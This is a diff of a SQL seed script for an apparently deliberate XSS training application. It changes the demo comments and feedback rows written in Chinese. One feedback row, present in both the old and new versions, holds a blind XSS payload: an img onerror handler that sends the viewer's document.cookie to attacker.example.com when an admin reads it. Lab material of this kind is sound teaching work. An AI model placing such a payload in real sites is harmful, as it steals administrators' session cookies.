@@ -65,14 +65,14 @@ WHERE (a.slug = 'xss-attack-defense' AND t.name IN ('Security', 'XSS', 'Tutorial
 -- Insert demo comments
 INSERT INTO comments (article_id, user_id, content_html, created_at)
 VALUES
-(1, 3, '<p>非常实用的安全指南！建议补充一下CSP的配置示例。</p>', NOW()),
-(2, 1, '<p>很有帮助的实战经验分享！</p>', NOW()),
-(2, 3, '<p>学到了，原来HttpOnly Cookie这么重要。</p>', NOW()),
-(3, 1, '<p>Composition API确实让代码组织更清晰了，感谢分享！</p>', NOW());
+(1, 3, '非常实用的安全指南！建议补充一下CSP的配置示例。', NOW()),
+(2, 1, '很有帮助的实战经验分享！', NOW()),
+(2, 3, '学到了，原来HttpOnly Cookie这么重要。', NOW()),
+(3, 1, 'Composition API确实让代码组织更清晰了，感谢分享！', NOW());
 
--- Insert demo feedbacks (including XSS demo payload for L3)
+-- Insert demo feedbacks (including XSS demo payload for 场景 5)
 INSERT INTO feedbacks (email, content_html, status, created_at)
 VALUES
-('normal@user.com', '<p>网站设计很棒，但是搜索功能有时候响应比较慢，希望能优化一下。</p>', 'NEW', NOW()),
-('evil@hacker.com', '<img src=x onerror="fetch(''https://attacker.example.com/admin-cookie?c=''+document.cookie)"><p>这是一个盲XSS测试载荷，当管理员查看此反馈时将触发。</p>', 'NEW', NOW()),
-('feedback@test.com', '<p>希望能增加夜间模式切换功能！</p>', 'READ', DATE_SUB(NOW(), INTERVAL 1 DAY));
+('normal@user.com', '网站设计很棒，但是搜索功能有时候响应比较慢，希望能优化一下。', 'NEW', NOW()),
+('evil@hacker.com', '<img src=x onerror="fetch(''https://attacker.example.com/admin-cookie?c=''+document.cookie)">这是一个盲XSS测试载荷，当管理员查看此反馈时将触发。', 'NEW', NOW()),
+('feedback@test.com', '希望能增加夜间模式切换功能！', 'READ', DATE_SUB(NOW(), INTERVAL 1 DAY));
